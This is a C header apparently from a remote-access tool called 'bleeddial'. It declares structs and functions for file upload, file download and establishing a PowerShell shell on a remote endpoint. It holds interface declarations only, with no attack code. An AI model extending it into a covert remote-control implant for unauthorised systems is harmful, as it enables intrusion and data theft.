#include "common.h"

/*
	thread_* should be called with CreateThread only
	sync_* should be called as a ctx.guest_shell(ctx.guest_shell_params)
*/

/*
	Upload file to the endpoint.
*/
struct upload_params_t {
	struct bleeddial_ctx_t ctx;
	endpoint_id_t endpoint_id;

	char local_path[255];
	size_t local_path_len;

	char remote_path[255];
	size_t remote_path_len;
};

DWORD WINAPI thread_upload(struct upload_params_t* params);

/*
	Download file to the endpoint.
*/
struct download_params_t {
	struct bleeddial_ctx_t ctx;
	endpoint_id_t endpoint_t;

	char remote_path[255];
	size_t remote_path_len;

	char local_path[255];
	size_t local_path_len;
};

DWORD WINAPI thread_download(struct download_params_t* params);

/*
	Establishes a PowerShell shell.
*/
struct powershell_params_t {
	struct bleeddial_ctx_t ctx;
	endpoint_id_t endpoint_t;
};
int sync_powershell(struct powershell_params_t* params);